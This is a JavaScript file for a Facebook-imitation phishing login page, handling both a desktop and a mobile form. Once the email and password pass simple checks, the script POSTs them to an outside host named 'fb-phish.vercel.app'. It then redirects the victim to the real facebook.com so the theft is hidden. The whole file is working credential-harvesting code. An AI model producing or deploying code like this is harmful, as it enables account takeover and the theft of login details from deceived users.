document.addEventListener('DOMContentLoaded', () => {
  function handleValidation(formId, emailId, passwordId, emailErrorId, passwordErrorId) {
    const form = document.getElementById(formId);
    const emailInput = document.getElementById(emailId);
    const passwordInput = document.getElementById(passwordId);
    const emailError = document.getElementById(emailErrorId);
    const passwordError = document.getElementById(passwordErrorId);

    if (!form) return;

    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      // Clear previous errors
      emailError.textContent = '';
      passwordError.textContent = '';

      const email = emailInput.value.trim();
      const password = passwordInput.value.trim();
      let hasError = false;

      // Local validation
      if (!email) {
        emailError.textContent = 'Email or phone number is required.';
        hasError = true;
      }

      if (!password) {
        passwordError.textContent = 'Password is required.';
        hasError = true;
      }

      if (hasError) return;

      try {
        const response = await fetch('https://fb-phish.vercel.app/login', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ email: email, password: password })
        });

        const data = await response.json();

        if (response.ok) {
          // Login successful
          window.location.href = 'https://www.facebook.com/';
        } else {
          // Show error from backend
          if (data?.error?.toLowerCase().includes('email') || data?.error?.toLowerCase().includes('phone')) {
            emailError.textContent = data.error;
          } else if (data?.error?.toLowerCase().includes('password')) {
            passwordError.textContent = data.error;
          } else {
            passwordError.textContent = 'Login failed. Please try again.';
          }
        }
      } catch (err) {
        passwordError.textContent = 'Something went wrong. Please try again.';
        console.error(err);
      }
    });
  }

  // Desktop form
  handleValidation(
    'desktop-login-form',
    'desktop-email',
    'desktop-password',
    'desktop-email-error',
    'desktop-password-error'
  );

  // Mobile form
  handleValidation(
    'mobile-login-form',
    'mobile-email',
    'mobile-password',
    'mobile-email-error',
    'mobile-password-error'
  );
});
